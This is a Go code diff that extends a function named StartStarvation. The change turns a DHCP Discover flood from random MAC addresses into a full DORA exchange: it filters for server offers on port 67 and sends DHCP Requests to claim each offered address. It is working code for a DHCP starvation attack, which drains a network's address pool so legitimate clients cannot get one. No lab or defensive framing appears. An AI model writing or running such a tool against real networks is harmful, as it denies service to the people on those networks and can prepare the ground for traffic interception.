@@ -13,7 +13,7 @@ import (
 	"github.com/google/gopacket/pcap"
 )
 
-// basically need to send DHCP Discover with random MAC address
+// The full dhcp DORA
 
 func StartStarvation(iface network.NetworkInterface, count int) error {
 
@@ -30,6 +30,17 @@ func StartStarvation(iface network.NetworkInterface, count int) error {
 	}
 
 	defer handle.Close()
+
+	// listen to offer -> listen for offer come from port 67 (server)
+	filter := "udp src port 67"
+
+	err = handle.SetBPFFilter(filter)
+
+	if err != nil {
+		return fmt.Errorf("failed to set BPF filter: %v", err)
+	}
+
+	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 
 	for i := 0; i < count; i++ {
 
@@ -97,11 +108,67 @@ func StartStarvation(iface network.NetworkInterface, count int) error {
 
 		err = handle.WritePacketData(buf.Bytes())
 		if err != nil {
-			return fmt.Errorf("failed to send DHCP response: %v", err)
+			return fmt.Errorf("failed to send DHCP Discover: %v", err)
 		}
 
 		fmt.Printf("[%d/%d] Sent DHCP Discover from %s\n", i+1, count, randomMAC)
-		
+
+		// listen for DHCP offer
+		packet, err := packetSource.NextPacket()
+
+		if err != nil {
+			continue
+		}
+
+		dhcpLayer := packet.Layer(layers.LayerTypeDHCPv4)
+
+		if dhcpLayer == nil {
+			continue
+		}
+
+		offer, ok := dhcpLayer.(*layers.DHCPv4)
+
+		if !ok {
+			continue
+		}
+
+		offeredIP := offer.YourClientIP
+		eth.SrcMAC = offer.ClientHWAddr
+
+		// send DHCP request
+		dhcpRequest := layers.DHCPv4{
+			Operation:    layers.DHCPOpRequest,
+			HardwareType: layers.LinkTypeEthernet,
+			HardwareLen:  6,
+			Xid:          offer.Xid,
+			ClientHWAddr: offer.ClientHWAddr,
+			Options: layers.DHCPOptions{
+				layers.DHCPOption{
+					Type:   layers.DHCPOptMessageType,
+					Data:   []byte{byte(layers.DHCPMsgTypeRequest)},
+					Length: 1,
+				},
+				layers.DHCPOption{
+					Type:   layers.DHCPOptRequestIP,
+					Data:   offeredIP.To4(),
+					Length: 4,
+				},
+			},
+		}
+
+		buf2 := gopacket.NewSerializeBuffer()
+		err = gopacket.SerializeLayers(buf2, opts, &eth, &ipv4, &udp, &dhcpRequest)
+		if err != nil {
+			return fmt.Errorf("failed to serialize DHCP request: %v", err)
+		}
+
+		err = handle.WritePacketData(buf2.Bytes())
+		if err != nil {
+			return fmt.Errorf("failed to send DHCP request: %v", err)
+		}
+
+		fmt.Printf("    → Requested IP: %s\n", offeredIP)
+
 		// small delay (not overwhelm the interface)
 		time.Sleep(100 * time.Millisecond)
 
